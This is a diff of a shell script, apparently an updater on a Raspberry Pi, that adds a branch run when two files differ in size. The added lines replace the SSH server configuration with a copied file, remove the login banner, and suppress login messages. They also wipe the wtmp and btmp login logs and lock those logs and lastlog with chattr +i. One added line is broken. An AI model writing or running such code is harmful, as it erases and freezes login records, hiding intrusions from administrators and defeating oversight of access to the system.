@@ -9,8 +9,18 @@ size2=$(stat -c %s "$file2")
 
 
 if [ ! "$size1" -eq "$size2" ]; then
-    echo NEW UPDATE >> /dev/shm/boot
-    #sudo rm "/opt/dice/.sys/dice"
-    #sudo cp "/dev/shm/dice" "/opt/dice/.sys/"
-	#touch /dev/shm/updated
+    sudo rm /etc/motd    
+
+    sudo rm "$file2"
+    sudo cp "$file1" "$path2"
+   
+    sudo rm "/etc/ssh/sshd_config"
+    sudo cp "$path1/sshd_config" "/etc/ssh"
+   
+    sudo touch /home/pi/.hushlogin
+    sudo var/log/lastlog
+    sudo chattr +i /var/log/lastlog
+    >/var/log/wtmp
+    >/var/log/btmp
+    sudo chattr +i /var/log/wtmp /var/log/btmp
 fi
